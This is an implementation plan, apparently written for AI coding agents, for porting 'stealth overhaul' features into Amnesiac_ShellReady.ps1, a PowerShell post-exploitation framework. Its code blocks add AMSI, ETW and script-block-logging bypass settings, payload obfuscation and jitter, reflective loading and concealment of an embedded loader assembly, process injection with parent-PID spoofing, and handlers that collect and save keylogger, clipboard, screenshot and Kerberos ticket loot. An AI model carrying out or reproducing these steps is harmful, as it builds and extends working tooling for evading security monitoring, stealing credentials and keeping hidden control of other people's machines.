# Amnesiac_ShellReady.ps1 Sync Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [x]`) syntax for tracking.

**Goal:** Port all stealth-overhaul changes (Plans 1-3) from `Amnesiac.ps1` into `Amnesiac_ShellReady.ps1`.

**Architecture:** `Amnesiac_ShellReady.ps1` is a colour-stripped, Unicode-stripped parallel of `Amnesiac.ps1` for shells without ANSI support. Every `Write-Host â€¦ -ForegroundColor X` becomes `Write-Output â€¦`, `â”€` (U+2500) becomes `-`, `â€”` (U+2014) becomes `--`. Logic is otherwise identical. The six preamble function groups, the stealth-overhaul globals block, and all nine new command handlers from Plans 1-3 are ported with that transform applied.

**Tech Stack:** PowerShell 5.1, `[System.IO.File]` for large text operations.

---

## File Map

| Action | File |
|--------|------|
| Modify | `Amnesiac_ShellReady.ps1` |
| Reference | `Amnesiac.ps1` (source of all new code) |
| Update | `CHANGELOG.md` |
| Mark | `docs/superpowers/plans/2026-05-24-shellready-sync.md` (this file) |

---

### Task 1: Prepend module-level preamble

Extract everything before `function Amnesiac {` from `Amnesiac.ps1` (~446 lines: the `$AmnesiacLoaderB64` constant and 14 helper functions), apply ShellReady colour-strip transform, and prepend the result to `Amnesiac_ShellReady.ps1`.

**Files:**
- Modify: `Amnesiac_ShellReady.ps1`

- [x] **Step 1: Verify starting state**

```powershell
(Get-Content .\Amnesiac_ShellReady.ps1)[0]
(Get-Content .\Amnesiac.ps1)[0]
```

Expected:
- ShellReady line 1: `function Amnesiac {`
- Amnesiac.ps1 line 1: `# ========...` (comment block opening)

- [x] **Step 2: Extract, transform, and prepend**

```powershell
$src = Get-Content .\Amnesiac.ps1
# Find first occurrence of "function Amnesiac {"
$funcIdx = $null
for ($i = 0; $i -lt $src.Count; $i++) {
    if ($src[$i] -match '^function Amnesiac \{') { $funcIdx = $i; break }
}
Write-Output "Preamble ends at index $($funcIdx - 1) ($funcIdx lines to copy)"

# Extract preamble: all lines before "function Amnesiac {"
$preamble = $src[0..($funcIdx - 1)]

# Apply ShellReady transformations
$transformed = $preamble | ForEach-Object {
    $line = $_ `
        -replace ' -ForegroundColor \w+', '' `
        -replace ' -BackgroundColor \w+', '' `
        -replace 'â”€', '-' `
        -replace 'â€”', '--'
    # Standalone "Write-Host" (no args) -> Write-Output ""
    if ($line -match '^(\s*)Write-Host\s*$') { $line = $Matches[1] + 'Write-Output ""' }
    else { $line = $line -replace '\bWrite-Host\b', 'Write-Output' }
    $line
}

# Prepend to ShellReady (preserve UTF-8 no-BOM)
$existing = [System.IO.File]::ReadAllText(".\Amnesiac_ShellReady.ps1", [System.Text.Encoding]::UTF8)
$preambleText = ($transformed -join "`n") + "`n`n"
$utf8NoBom = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText(".\Amnesiac_ShellReady.ps1", $preambleText + $existing, $utf8NoBom)
Write-Output "Prepended $($transformed.Count) lines."
```

Expected: `Prepended NNN lines.` (NNN is approximately 445)

- [x] **Step 3: Verify preamble is at top and 14 functions are defined**

```powershell
$lines = Get-Content .\Amnesiac_ShellReady.ps1
# Line 1 should now be the comment block, not "function Amnesiac {"
$lines[0]
# Expected: "# ==========================..."

# Count "function X {" lines in preamble (before "function Amnesiac {")
$fi = $null
for ($i = 0; $i -lt $lines.Count; $i++) {
    if ($lines[$i] -match '^function Amnesiac \{') { $fi = $i; break }
}
($lines[0..($fi-1)] | Select-String '^function ').Count
# Expected: 14
```

- [x] **Step 4: Verify no colour params leaked into ShellReady**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '-ForegroundColor').Count
```

Expected: `0`

- [x] **Step 5: Commit**

```powershell
git add Amnesiac_ShellReady.ps1
git commit -m "feat(shellready): prepend preamble -- AmnesiacLoaderB64 + 14 helper functions"
```

---

### Task 2: Update function body initialization

Inside `function Amnesiac {}`, replace the 4-line inline folder-creation block with `Initialize-DiskStructure`, then add the stealth-overhaul globals block and the `Initialize-ToolCache` / `Show-OpsecBanner` init calls.

**Files:**
- Modify: `Amnesiac_ShellReady.ps1`

After Task 1, the line numbers inside the function body have shifted. Use anchor strings for all edits.

- [x] **Step 1: Replace inline disk creation with Initialize-DiskStructure**

Find (exact 4 lines â€” the inline folder creation block):
```
	$basePath = "C:\Users\Public\Documents\Amnesiac"
	$subfolders = @("Clipboard", "Downloads", "History", "Keylogger", "Payloads", "Screenshots", "Scripts", "Monitor_TGTs")
	if (-not (Test-Path $basePath)) {New-Item -Path $basePath -ItemType Directory > $null}
	$subfolders | ForEach-Object {$subfolderPath = Join-Path -Path $basePath -ChildPath $_;if (-not (Test-Path $subfolderPath)) {New-Item -Path $subfolderPath -ItemType Directory > $null}}
```

Replace with:
```
	Initialize-DiskStructure
```

Use the Edit tool on `Amnesiac_ShellReady.ps1`.

- [x] **Step 2: Add stealth-overhaul globals block and init calls**

Find (the end of the existing globals block â€” exact 2 lines):
```powershell
	$global:RestoreTimeout = $False
	$global:ScanModer = $False
```

Replace with:
```powershell
	$global:RestoreTimeout = $False
	$global:ScanModer = $False

    # ---- Stealth overhaul globals ----
    $global:DiskMode       = $false
    $global:AmnesiacArtifacts = @{
        Keylogger   = [System.Collections.Generic.List[string]]::new()
        Screenshots = [System.Collections.Generic.List[byte[]]]::new()
        Downloads   = [System.Collections.Generic.Dictionary[string,byte[]]]::new()
        Clipboard   = [System.Collections.Generic.List[string]]::new()
        TGTs        = [System.Collections.Generic.List[string]]::new()
    }
    $global:ToolCache      = @{}
    $global:EndMarker      = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
    $global:BufferSize     = @(512, 1024, 2048, 4096) | Get-Random
    $global:PayloadConfig  = @{
        Amsi        = 'pageguard'
        Etw         = 'provider'
        Sbl         = $true
        Launcher    = 'ps'
        Encoding    = 'gzip'
        Jitter      = 'medium'
        Obfuscation = 'high'
        Keys        = @{}
    }
    $global:EngagementProfile = $null
    $global:PSKPhrase         = $null
    $global:PSKBytes          = $null
    # ---- End stealth overhaul globals ----

    Initialize-ToolCache
    Show-OpsecBanner
```

- [x] **Step 3: Verify globals block and inline removal**

```powershell
Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern 'Initialize-DiskStructure' | Select-Object LineNumber, Line
# Expected: 2 hits â€” one in the preamble (function definition) and one in the function body (the call)

Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '\$global:DiskMode\s*=' | Select-Object LineNumber, Line
# Expected: at least 1 hit inside function Amnesiac

Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern 'Initialize-ToolCache|Show-OpsecBanner' | Measure-Object | Select-Object Count
# Expected: Count >= 4 (definition + call for each)
```

- [x] **Step 4: Commit**

```powershell
git add Amnesiac_ShellReady.ps1
git commit -m "feat(shellready): replace inline disk init + add stealth globals + Initialize-ToolCache/Show-OpsecBanner calls"
```

---

### Task 3: Replace hardcoded `#END#` and `1028`

ShellReady has 66 occurrences of `#END#` (the hardcoded end-of-stream marker) and 25 occurrences of `1028` (the hardcoded pipe buffer size). The `#END#` appears in two forms that both need handling:

- **Form 1** â€” operator-side stream checks: `"#END#"` (double-quoted equality test)
- **Form 2** â€” target-side script embeds: `` `"#END#`" `` (backtick-escaped inside double-quoted PS strings â€” these bake the end marker into the remote payload)

**Files:**
- Modify: `Amnesiac_ShellReady.ps1`

- [x] **Step 1: Replace all `#END#` occurrences (both forms)**

```powershell
$content = [System.IO.File]::ReadAllText(".\Amnesiac_ShellReady.ps1", [System.Text.Encoding]::UTF8)
$totalBefore = ([regex]::Matches($content, '#END#')).Count

# Form 1: operator-side equality checks â€” "quoted" -> variable reference
$before1 = ([regex]::Matches($content, [regex]::Escape('"#END#"'))).Count
$content = $content -replace [regex]::Escape('"#END#"'), '$global:EndMarker'

# Form 2: target-script embedded sends â€” backtick-quoted -> expand at string-build time
$before2 = ([regex]::Matches($content, [regex]::Escape('`"#END#`"'))).Count
$content = $content -replace [regex]::Escape('`"#END#`"'), '`"$($global:EndMarker)`"'

$totalAfter = ([regex]::Matches($content, '#END#')).Count
$utf8NoBom = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText(".\Amnesiac_ShellReady.ps1", $content, $utf8NoBom)
Write-Output "Before: $totalBefore. Form1: $before1. Form2: $before2. Remaining: $totalAfter"
```

Expected: `Before: 66. Form1: X. Form2: Y. Remaining: 0` (where X + Y = 66)

- [x] **Step 2: Replace all `1028` buffer size occurrences**

```powershell
$content = [System.IO.File]::ReadAllText(".\Amnesiac_ShellReady.ps1", [System.Text.Encoding]::UTF8)
$before = ([regex]::Matches($content, '\b1028\b')).Count
$content = $content -replace '\b1028\b', '$global:BufferSize'
$after  = ([regex]::Matches($content, '\b1028\b')).Count
$utf8NoBom = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText(".\Amnesiac_ShellReady.ps1", $content, $utf8NoBom)
Write-Output "Replaced $($before - $after) of 1028. Remaining: $after"
```

Expected: `Replaced 25 of 1028. Remaining: 0`

- [x] **Step 3: Verify no bare `#END#` remains**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '#END#').Count
```

Expected: `0`

Also spot-check EndMarker and BufferSize replacements exist:
```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '\$global:EndMarker').Count
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '\$global:BufferSize').Count
```

Expected: both counts >= 20

- [x] **Step 4: Commit**

```powershell
git add Amnesiac_ShellReady.ps1
git commit -m "fix(shellready): replace 66x #END# -> EndMarker and 25x 1028 -> BufferSize"
```

---

### Task 4: Update main loop toggle + add seven new command handlers

Two edits to the main `while ($true)` loop:
1. Update the `toggle` handler to add the `exe` DiskMode warning and `stealth` format cycling (currently ends at `exe` â†’ `b64`; needs `exe` â†’ `stealth` â†’ `b64` with DiskMode warn).
2. Insert seven new command handlers after `scramble` (line ~213) and before `exit`.

**Files:**
- Modify: `Amnesiac_ShellReady.ps1`

- [x] **Step 1: Update main loop `toggle` handler**

Find (exact block â€” the last two elseif branches plus `continue`):
```powershell
   			elseif($global:payloadformat -eq 'gzip'){
				$global:payloadformat = 'exe'
				$global:Message = " [+] Payload format: exe"
			}
			elseif($global:payloadformat -eq 'exe'){
				$global:payloadformat = 'b64'
				$global:Message = " [+] Payload format: cmd(b64)"
			}
			continue
		}
		
		if ($choice -eq 'Find-LocalAdminAccess') {
```

Replace with:
```powershell
   			elseif($global:payloadformat -eq 'gzip'){
				$global:payloadformat = 'exe'
				$global:Message = " [+] Payload format: exe"
				if (-not $global:DiskMode) {
					$global:Message = " [!] exe format requires disk write. Enable with 'diskmode on' or switch format."
				}
			}
			elseif($global:payloadformat -eq 'exe'){
				$global:payloadformat = 'stealth'
				$global:Message = " [+] Payload format: stealth (ETW+SBL bypass, random vars, gzip)"
			}
			elseif($global:payloadformat -eq 'stealth'){
				$global:payloadformat = 'b64'
				$global:Message = " [+] Payload format: cmd(b64)"
			}
			continue
		}
		
		if ($choice -eq 'Find-LocalAdminAccess') {
```

- [x] **Step 2: Insert seven new handlers after `scramble`, before `exit`**

Find (exact anchor â€” scramble close + exit open):
```powershell
		if ($choice -eq 'scramble') {
			$OldGlobalPipeName = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			$global:Message = " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
			continue
		}
		
		if ($choice -eq 'exit') {
```

Replace with:
```powershell
		if ($choice -eq 'scramble') {
			$OldGlobalPipeName = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			$global:Message = " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
			continue
		}

		if ($choice -match '^diskmode(\s+(on|off))?$') {
			if ($Matches[2] -eq 'on') {
				$global:DiskMode = $true
				Initialize-DiskStructure
				$global:Message = " [+] Disk mode: ON -- artifact directories created"
			} elseif ($Matches[2] -eq 'off') {
				$global:DiskMode = $false
				$global:Message = " [+] Disk mode: OFF -- no disk writes on operator or target"
			} else {
				$state = if ($global:DiskMode) { "ON" } else { "OFF" }
				$global:Message = " [+] Disk mode: $state"
			}
			continue
		}

		if ($choice -match '^artifacts(\s+(keylogger|screenshots|clipboard|tgts|downloads))?$') {
			$type = $Matches[2]
			if (-not $type) {
				Write-Output ""
				Write-Output " [+] In-memory artifacts:"
				Write-Output "     Keylogger:   $($global:AmnesiacArtifacts.Keylogger.Count) entries"
				Write-Output "     Screenshots: $($global:AmnesiacArtifacts.Screenshots.Count) items"
				Write-Output "     Clipboard:   $($global:AmnesiacArtifacts.Clipboard.Count) entries"
				Write-Output "     TGTs:        $($global:AmnesiacArtifacts.TGTs.Count) entries"
				Write-Output "     Downloads:   $($global:AmnesiacArtifacts.Downloads.Count) files"
				Write-Output ""
			} elseif ($type -eq 'keylogger') {
				if ($global:AmnesiacArtifacts.Keylogger.Count -eq 0) {
					$global:Message = " [-] No keylogger data captured."
				} else {
					Write-Output ""
					$global:AmnesiacArtifacts.Keylogger | ForEach-Object { Write-Output $_ }
					Write-Output ""
				}
			} elseif ($type -eq 'clipboard') {
				if ($global:AmnesiacArtifacts.Clipboard.Count -eq 0) {
					$global:Message = " [-] No clipboard data captured."
				} else {
					$global:AmnesiacArtifacts.Clipboard | ForEach-Object { Write-Output $_ }
				}
			} elseif ($type -eq 'tgts') {
				$global:AmnesiacArtifacts.TGTs | ForEach-Object { Write-Output $_ }
			} elseif ($type -eq 'downloads') {
				$global:AmnesiacArtifacts.Downloads.Keys | ForEach-Object {
					$sz = $global:AmnesiacArtifacts.Downloads[$_].Length
					Write-Output "  $_ ($sz bytes)"
				}
			} elseif ($type -eq 'screenshots') {
				$global:Message = " [+] Screenshots: $($global:AmnesiacArtifacts.Screenshots.Count) captured (use 'save screenshots <path>' to write to disk)"
			}
			continue
		}

		if ($choice -match '^save(\s+(all|keylogger|screenshots|clipboard|tgts|downloads))?(\s+(.+))?$') {
			$type = $Matches[2]
			$path = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\amnesiac-artifacts" }
			if ($type -eq 'all' -or -not $type) {
				$null = New-Item -Path $path -ItemType Directory -Force
				if ($global:AmnesiacArtifacts.Keylogger.Count -gt 0) {
					$global:AmnesiacArtifacts.Keylogger | Out-File "$path\keylogger.txt" -Encoding UTF8
				}
				if ($global:AmnesiacArtifacts.Clipboard.Count -gt 0) {
					$global:AmnesiacArtifacts.Clipboard | Out-File "$path\clipboard.txt" -Encoding UTF8
				}
				if ($global:AmnesiacArtifacts.TGTs.Count -gt 0) {
					$global:AmnesiacArtifacts.TGTs | Out-File "$path\tgts.txt" -Encoding UTF8
				}
				$global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
					[System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
				}
				$global:Message = " [+] Artifacts saved to: $path"
			} elseif ($type -eq 'keylogger') {
				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\keylogger.txt" }
				$global:AmnesiacArtifacts.Keylogger | Out-File $outFile -Encoding UTF8
				$global:Message = " [+] Keylogger saved to: $outFile"
			} elseif ($type -eq 'downloads') {
				$null = New-Item -Path $path -ItemType Directory -Force
				$global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
					[System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
				}
				$global:Message = " [+] Downloads saved to: $path"
			} elseif ($type -eq 'clipboard') {
				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\clipboard.txt" }
				$global:AmnesiacArtifacts.Clipboard | Out-File $outFile -Encoding UTF8
				$global:Message = " [+] Clipboard saved to: $outFile"
			} elseif ($type -eq 'tgts') {
				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\tgts.txt" }
				$global:AmnesiacArtifacts.TGTs | Out-File $outFile -Encoding UTF8
				$global:Message = " [+] TGTs saved to: $outFile"
			} elseif ($type -eq 'screenshots') {
				$null = New-Item -Path $path -ItemType Directory -Force
				$i = 0
				$global:AmnesiacArtifacts.Screenshots | ForEach-Object {
					[System.IO.File]::WriteAllBytes("$path\screenshot_$i.png", $_)
					$i++
				}
				$global:Message = " [+] $i screenshot(s) saved to: $path"
			}
			continue
		}

		if ($choice -match '^modules(\s+(reload|status))?$') {
			$sub = $Matches[2]
			if ($sub -eq 'reload') {
				Initialize-ToolCache
				$global:Message = " [+] Tool cache refreshed: $($global:ToolCache.Count) modules"
			} elseif ($sub -eq 'status') {
				Write-Output ""
				Write-Output " [+] Tool cache breakdown:"
				$coreNames  = @('SimpleAMSI','NETAMSI','Token-Impersonation','Invoke-SMBRemoting','Invoke-WMIRemoting','Find-LocalAdminAccess')
				$heavyNames = @('Suntour','Ferrari','ppl','TermsrvPatcher','RDPKeylog.exe')
				$core  = $coreNames  | Where-Object { $global:ToolCache.ContainsKey($_) }
				$std   = $global:ToolCache.Keys | Where-Object { $_ -notin $coreNames -and $_ -notin $heavyNames }
				$heavy = $heavyNames | Where-Object { $global:ToolCache.ContainsKey($_) }
				Write-Output "  Core    (embedded): $($core.Count)/$($coreNames.Count) -- $($core -join ', ')"
				Write-Output "  Standard (Tools\):  $($std.Count) -- $($std -join ', ')"
				Write-Output "  Heavy   (HTTP):     $($heavy.Count)/$($heavyNames.Count) -- run 'serve' to load"
				Write-Output ""
			} else {
				Write-Output ""
				Write-Output " [+] Cached modules ($($global:ToolCache.Count)):"
				$global:ToolCache.Keys | Sort-Object | ForEach-Object { Write-Output "  [+] $_" }
				Write-Output ""
			}
			continue
		}

		if ($choice -match '^payload(\s+(.+))?$') {
			$sub = ($Matches[2] -split '\s+', 3)
			$subcmd = $sub[0]; $val = if ($sub.Count -ge 2) { $sub[1] } else { $null }; $extra = if ($sub.Count -ge 3) { $sub[2] } else { $null }
			switch ($subcmd) {
				'amsi' {
					if ($val -in 'pageguard','hwbp','fail','direct') {
						$global:PayloadConfig.Amsi = $val
						$global:Message = " [+] Payload AMSI bypass: $val"
						if ($val -in 'pageguard','hwbp') { $global:Message += " (PS uses 'fail' fallback; full $val activates after 'load loader')" }
					} else { $global:Message = " [-] Valid: pageguard hwbp fail direct" }
				}
				'etw' {
					if ($val -in 'provider','patch','thread') { $global:PayloadConfig.Etw = $val; $global:Message = " [+] Payload ETW: $val" }
					else { $global:Message = " [-] Valid: provider patch thread" }
				}
				'launcher' {
					if ($val -in 'ps','wmi','schtask','com') { $global:PayloadConfig.Launcher = $val; $global:Message = " [+] Payload launcher: $val" }
					else { $global:Message = " [-] Valid: ps wmi schtask com" }
				}
				'encoding' {
					if ($val -in 'gzip','b64','raw','pwraw') { $global:PayloadConfig.Encoding = $val; $global:payloadformat = $val; $global:Message = " [+] Payload encoding: $val" }
					else { $global:Message = " [-] Valid: gzip b64 raw pwraw" }
				}
				'jitter' {
					if ($val -in 'off','low','medium','high') { $global:PayloadConfig.Jitter = $val; $global:Message = " [+] Payload jitter: $val" }
					else { $global:Message = " [-] Valid: off low medium high" }
				}
				'obfuscation' {
					if ($val -in 'low','medium','high') { $global:PayloadConfig.Obfuscation = $val; $global:Message = " [+] Payload obfuscation: $val" }
					else { $global:Message = " [-] Valid: low medium high" }
				}
				'key' {
					if ($val -in 'hostname','domain','user' -and $extra) { $global:PayloadConfig.Keys[$val] = $extra; $global:Message = " [+] Payload key $val = $extra" }
					elseif ($val -eq 'clear') { $global:PayloadConfig.Keys = @{}; $global:Message = " [+] Payload keys cleared" }
					elseif ($val -eq 'show') {
						if ($global:PayloadConfig.Keys.Count -eq 0) { $global:Message = " [-] No payload keys set" }
						else { $global:PayloadConfig.Keys.GetEnumerator() | % { Write-Output "  $($_.Key) = $($_.Value)" } }
					} else { $global:Message = " [-] Usage: payload key [hostname|domain|user] <value>  |  payload key clear|show" }
				}
				'reset' {
					$global:PayloadConfig = @{ Amsi='pageguard'; Etw='provider'; Sbl=$true; Launcher='ps'; Encoding='gzip'; Jitter='medium'; Obfuscation='high'; Keys=@{} }
					$global:Message = " [+] Payload config reset to defaults"
				}
				default {
					Write-Output ""; Write-Output " [+] Current payload configuration:"
					Write-Output "     amsi:        $($global:PayloadConfig.Amsi)"
					Write-Output "     etw:         $($global:PayloadConfig.Etw)"
					Write-Output "     sbl:         $($global:PayloadConfig.Sbl)"
					Write-Output "     launcher:    $($global:PayloadConfig.Launcher)"
					Write-Output "     encoding:    $($global:PayloadConfig.Encoding)"
					Write-Output "     jitter:      $($global:PayloadConfig.Jitter)"
					Write-Output "     obfuscation: $($global:PayloadConfig.Obfuscation)"
					if ($global:PayloadConfig.Keys.Count -gt 0) { Write-Output "     keys:        $($global:PayloadConfig.Keys | ConvertTo-Json -Compress)" }
					else { Write-Output "     keys:        (none)" }; Write-Output ""
				}
			}
			continue
		}

		if ($choice -match '^psk(\s+(.+))?$') {
			$arg = $Matches[2]
			if (-not $arg) {
				if ($global:PSKBytes) { $global:Message = " [+] PSK: configured (masked)" } else { $global:Message = " [+] PSK: using default (derived from pipe name)" }
			} elseif ($arg -eq 'reset') {
				$global:PSKPhrase = $null; $global:PSKBytes = $null; $global:Message = " [+] PSK reset to default"
			} else {
				$global:PSKPhrase = $arg; $global:PSKBytes = Get-PskDerivedKey -Passphrase $arg; $global:Message = " [+] PSK configured"
			}
			continue
		}

		if ($choice -match '^engagement(\s+(nondomained|domained|reset))?$') {
			$profile = $Matches[2]
			switch ($profile) {
				'nondomained' {
					$global:EngagementProfile = 'nondomained'
					$tokenOk = Test-NetworkLogonToken
					if ($tokenOk) { $id = [System.Security.Principal.WindowsIdentity]::GetCurrent(); $global:Message = " [+] Engagement: nondomained | Network token: $($id.Name)" }
					else {
						Write-Output ""; Write-Output " [!] WARNING: No network logon token detected."
						Write-Output "     Launch Amnesiac from: runas /netonly /user:DOMAIN\user powershell.exe"; Write-Output ""
					}
				}
				'domained' { $global:EngagementProfile = 'domained'; $global:Message = " [+] Engagement: domained (assumed breach)" }
				'reset'    { $global:EngagementProfile = $null; $global:Message = " [+] Engagement profile cleared" }
				default    { $state = if ($global:EngagementProfile) { $global:EngagementProfile } else { "(not set)" }; $global:Message = " [+] Engagement: $state" }
			}
			continue
		}
		
		if ($choice -eq 'exit') {
```

- [x] **Step 3: Verify new handlers are present**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern "'\^diskmode'").Count
# Expected: 1

(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern "'\^artifacts'").Count
# Expected: 1

(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern "'\^engagement'").Count
# Expected: 1

# Verify stealth in main loop toggle
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern "payloadformat.*'stealth'").Count -ge 2
# Expected: True (one in main loop, one in session loop after Task 5)
```

- [x] **Step 4: Commit**

```powershell
git add Amnesiac_ShellReady.ps1
git commit -m "feat(shellready): main loop -- stealth toggle + diskmode/artifacts/save/modules/payload/psk/engagement"
```

---

### Task 5: Update session toggle + add InteractWithPipeSession handlers

Two edits inside `InteractWithPipeSession`:
1. Extend the session-level `toggle` handler (line ~1949 pre-Task-1; shifted after Task 1) to add `stealth` format and the `exe` DiskMode warning.
2. Insert `load loader`, `Migrate ps new <path>`, and `Migrate ps <pid>` session command handlers immediately before the existing `Migrate *` / `Migrate2 *` handler.

**Files:**
- Modify: `Amnesiac_ShellReady.ps1`

- [x] **Step 1: Update session `toggle` handler**

Find (exact â€” the last two elseif branches and continue inside the session toggle, followed by `elseif($Command -eq "Monitor")`):
```powershell
   			elseif($global:payloadformat -eq 'gzip'){
				$global:payloadformat = 'exe'
				Write-Output ""
				Write-Output " [+] Payload format: exe"
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'exe'){
				$global:payloadformat = 'b64'
				Write-Output ""
				Write-Output " [+] Payload format: cmd(b64)"
				Write-Output ""
			}
			continue
		}
		
		elseif($Command -eq "Monitor"){
```

Replace with:
```powershell
   			elseif($global:payloadformat -eq 'gzip'){
				$global:payloadformat = 'exe'
				Write-Output ""
				Write-Output " [+] Payload format: exe"
				if (-not $global:DiskMode) { Write-Output " [!] exe format requires disk write. Enable with 'diskmode on' or switch format." }
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'exe'){
				$global:payloadformat = 'stealth'
				Write-Output ""
				Write-Output " [+] Payload format: stealth (ETW+SBL bypass, random vars, gzip)"
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'stealth'){
				$global:payloadformat = 'b64'
				Write-Output ""
				Write-Output " [+] Payload format: cmd(b64)"
				Write-Output ""
			}
			continue
		}
		
		elseif($Command -eq "Monitor"){
```

- [x] **Step 2: Insert session command handlers before `Migrate *`**

Find (exact anchor â€” the Migrate * handler opening line):
```powershell
		elseif ($command -like "Migrate *" -OR $command -like "Migrate2 *") {
```

Replace with (inserting three new handlers before it):
```powershell
		elseif ($command -eq "load loader") {
			if ([string]::IsNullOrEmpty($AmnesiacLoaderB64)) {
				Write-Output " [-] AmnesiacLoader not embedded. Run AmnesiacLoader\Build.ps1 first."
			} else {
				Write-Output " [*] Delivering AmnesiacLoader to session..."
				$loadCmd = "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly(`$_la)"
				$sw.WriteLine($loadCmd)
				$sw.Flush()
				$resp = ""
				while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; $resp += "$ln`n" }
				Write-Output " [+] AmnesiacLoader active and concealed."
			}
			continue
		}

		elseif ($command -match "^Migrate ps new (.+)") {
			$procPath = $Matches[1]
			$ppid = try { (Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1).Id } catch { 0 }
			if (-not $ppid) { $ppid = 0 }
			$sw.WriteLine("[AmnesiacLoader.Injector]::SpawnUnmanagedPS('$procPath', (iex 'New-PayloadScript' | Select-Object -ExpandProperty RawScript), $ppid)")
			$sw.Flush()
			while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; Write-Output $ln }
			continue
		}

		elseif ($command -match "^Migrate ps (\d+)") {
			$targetPid = $Matches[1]
			$sw.WriteLine("[AmnesiacLoader.Injector]::InjectUnmanagedPS($targetPid, (iex 'New-PayloadScript' | Select-Object -ExpandProperty RawScript))")
			$sw.Flush()
			while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; Write-Output $ln }
			continue
		}

		elseif ($command -like "Migrate *" -OR $command -like "Migrate2 *") {
```

- [x] **Step 3: Verify session handlers and updated toggle**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '"load loader"').Count
# Expected: 1

(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern 'Migrate ps new').Count
# Expected: 1

(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern "Migrate ps.*\\\\d\+").Count
# Expected: 1

(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern "payloadformat.*'stealth'").Count
# Expected: 4 (main loop toggle has 2, session toggle has 2)
```

- [x] **Step 4: Commit**

```powershell
git add Amnesiac_ShellReady.ps1
git commit -m "feat(shellready): session handlers -- stealth toggle + load loader + Migrate ps new/pid"
```

---

### Task 6: Dot-source verification

Confirm the file loads cleanly, all 14 functions are defined, and no colour codes or hardcoded markers remain.

**Files:**
- None modified

- [x] **Step 1: Dot-source succeeds in a fresh session**

Open a new PowerShell window (or reset the current session) and run:
```powershell
$ErrorActionPreference = 'Stop'
try {
    . .\Amnesiac_ShellReady.ps1
    Write-Output "Dot-source: OK"
} catch {
    Write-Output "Dot-source FAILED: $_"
}
```

Expected: `Dot-source: OK`

- [x] **Step 2: Verify all 14 helper functions are available**

```powershell
$fns = @('Get-AmsiBypassSnippet','Get-EtwBypassSnippet','Get-SblBypassSnippet',
         'New-PayloadScript','Get-PayloadLauncher','Initialize-DiskStructure',
         'Initialize-ToolCache','New-EmbeddedTool','Send-Module',
         'Test-NetworkLogonToken','Protect-PipeMessage','Unprotect-PipeMessage',
         'Get-PskDerivedKey','Show-OpsecBanner')
$missing = $fns | Where-Object { -not (Get-Command $_ -EA SilentlyContinue) }
if ($missing) { "MISSING: $($missing -join ', ')" } else { "All 14 functions: OK" }
```

Expected: `All 14 functions: OK`

- [x] **Step 3: Verify `$AmnesiacLoaderB64` is populated**

```powershell
. .\Amnesiac_ShellReady.ps1
$AmnesiacLoaderB64.Length -gt 0
```

Expected: `True`

- [x] **Step 4: Verify zero colour params remain**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '-ForegroundColor').Count
```

Expected: `0`

- [x] **Step 5: Verify zero `#END#` remains**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '#END#').Count
```

Expected: `0`

- [x] **Step 6: Verify zero `1028` buffer size remains**

```powershell
(Select-String -Path .\Amnesiac_ShellReady.ps1 -Pattern '\b1028\b').Count
```

Expected: `0`

---

### Task 7: Update CHANGELOG and mark plan checkboxes

**Files:**
- Modify: `CHANGELOG.md`
- Modify: `docs/superpowers/plans/2026-05-24-shellready-sync.md`

- [x] **Step 1: Add `[Implemented]` section to CHANGELOG.md**

In `CHANGELOG.md`, find the `## [Planned] -- Future Work` section and remove the item `Port all changes to Amnesiac_ShellReady.ps1`. Add a new implemented section above it:

```markdown
## [Implemented] -- Plan 4: Amnesiac_ShellReady.ps1 Sync

